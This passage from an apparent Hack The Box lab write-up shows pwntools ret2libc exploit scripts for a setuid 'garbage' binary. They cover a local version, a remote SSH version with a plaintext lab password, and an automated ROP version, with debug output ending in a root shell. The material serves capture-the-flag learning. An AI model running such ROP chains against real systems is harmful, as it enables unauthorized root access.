<span class="c1">#Enter access password: 123456</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>

<span class="c1">#unpack again</span>
<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>

<span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x74040</span> <span class="c1">#local</span>

<span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;ghttps://wappalyzer.com/libc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>

<span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span>
<span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x183cee</span> <span class="c1"># local</span>

<span class="n">setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc8ac0</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># local</span>

<span class="n">sys</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sys</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sh</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">setuid</span> <span class="o">+</span> <span class="n">libc_setuid</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">sh</span> <span class="o">+</span> <span class="n">sys</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>When running the script we grab a shell (as I use my Kali VM on root we don't
see a real privilege escalation):</p>
<div class="highlight"><pre><span></span><code># python exploit.py
[+] Starting local process &#39;./garbage&#39;: pid 1909
Enter access password:

access denied.

[+] Leaked puts@GLIBC: @P\x84tC\x7f\x00\x00
[*] glibc offset: 7f43747d1000
Enter access password:

access denied.

[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div>

<h2>Running the exploit remotely</h2>
<p>In order to run the exploit remotely we need to change the <code>LIBC</code> addresses with
the one we copy from the ellingson machine. We also need to change our process
to use the one remote. <a href="https://github.com/Gallopsled/pwntools">Pnwtools</a> is
perfect for that as we just need to change our <code>process</code> variable. Our final
scrip is now:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;margo&#39;</span><span class="p">,</span> <span class="s1">&#39;10.10.10.139&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;iamgod$08&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span>
<span class="n">p</span><span class="o">=</span><span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/usr/bin/garbage&#39;</span><span class="p">])</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>


<span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
<span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
<span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>

<span class="c1">#Enter access password: 123456</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>

<span class="c1">#unpack again</span>
<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>

<span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x74040</span> <span class="c1">#local</span>
<span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x809c0</span> <span class="c1"># remote</span>

<span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;glibc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>

<span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span>
<span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x4f440</span> <span class="c1"># remote</span>

<span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x183cee</span> <span class="c1"># local</span>
<span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x1b3e9a</span> <span class="c1"># remote</span>

<span class="n">setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>

<span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc8ac0</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># local</span>
<span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe5970</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># remote</span>

<span class="n">sys</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sys</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sh</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">setuid</span> <span class="o">+</span> <span class="n">libc_setuid</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">sh</span> <span class="o">+</span> <span class="n">sys</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>The output of the script give us a root shell on the machine:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# python exploitR.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process &#39;/usr/bin/garbage&#39; on 10.10.10.139: pid 3704
[DEBUG] Sent 0xa9 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000090  28 40 40 00  00 00 00 00  50 10 40 00  00 00 00 00  │(@@·│····│P·@·│····│
    000000a0  19 16 40 00  00 00 00 00  0a                        │··@·│····│·│
    000000a9
[DEBUG] Received 0x17 bytes:
    &#39;Enter access password: &#39;
[DEBUG] Received 0x2e bytes:
    00000000  0a 61 63 63  65 73 73 20  64 65 6e 69  65 64 2e 0a  │·acc│ess │deni│ed.·│
    00000010  c0 59 74 0f  f5 7f 0a 45  6e 74 65 72  20 61 63 63  │·Yt·│···E│nter│ acc│
    00000020  65 73 73 20  70 61 73 73  77 6f 72 64  3a 20        │ess │pass│word│: │
    0000002e
Enter access password:

access denied.

[+] Leaked puts@GLIBC: �Yt\x0f�
[*] glibc offset: 7ff50f6c5000
[DEBUG] Sent 0xb9 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000090  00 00 00 00  00 00 00 00  70 a9 7a 0f  f5 7f 00 00  │····│····│p·z·│····│
    000000a0  9b 17 40 00  00 00 00 00  9a 8e 87 0f  f5 7f 00 00  │··@·│····│····│····│
    000000b0  40 44 71 0f  f5 7f 00 00  0a                        │@Dq·│····│·│
    000000b9
[DEBUG] Received 0x12 bytes:
    &#39;\n&#39;
    &#39;access denied.\n&#39;
    &#39;# &#39;
Enter access password:

access denied.

[*] Switching to interactive mode
# $ id
[DEBUG] Sent 0x3 bytes:
    &#39;id\n&#39;
[DEBUG] Received 0x31 bytes:
    &#39;uid=0(root) gid=1002(margo) groups=1002(margo)\n&#39;
    &#39;# &#39;
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cat /root/root.txt
[DEBUG] Sent 0x13 bytes:
    &#39;cat /root/root.txt\n&#39;
[DEBUG] Received 0x23 bytes:
    &#39;1cc73&lt;redacted&gt;\n&#39;
    &#39;# &#39;
1cc73&lt;redacterd&gt;
</code></pre></div>

<h1>Wrapping up</h1>
<p>What a journey! Exploiting this buffer overflow allow me to learn a lot about
<a href="http://pwntools.com">pwntools</a>. The binary manipulation is a bit strange as
here is no need to wait for the <code>garbage</code> binary to ask for the password. But
the possibility to exploit a remote binary so easily is something precious.</p>
<h2>Automated pwn</h2>
<p>We can also use <a href="http://pwntools.com">pwntools</a> to fully automate the exploit
and make it compute the addresses automatically:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">,</span> <span class="n">setuid</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>

<span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regs</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;rdi&#39;</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s1">&#39;regs&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP chains:&#39;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>

<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;leaked puts: &#39;</span><span class="o">+</span><span class="n">leaked_puts</span><span class="p">)</span>
<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span>  <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">rop2</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">rop2</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP2: &#39;</span><span class="o">+</span> <span class="n">rop2</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>But this won't "fully" work as the SUID part is not in it.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/buffer-overflow.html">buffer overflow</a>
      <a href="../../tag/rop.html">ROP</a>
      <a href="../../tag/ret2libc.html">ret2libc</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2019/10/htb-writeup.html" title="HTB: Writeup">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2019/11/htb-jarvis.html" title="HTB: Jarvis">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "",
  "description": ""
}
</script>

</body>
</html>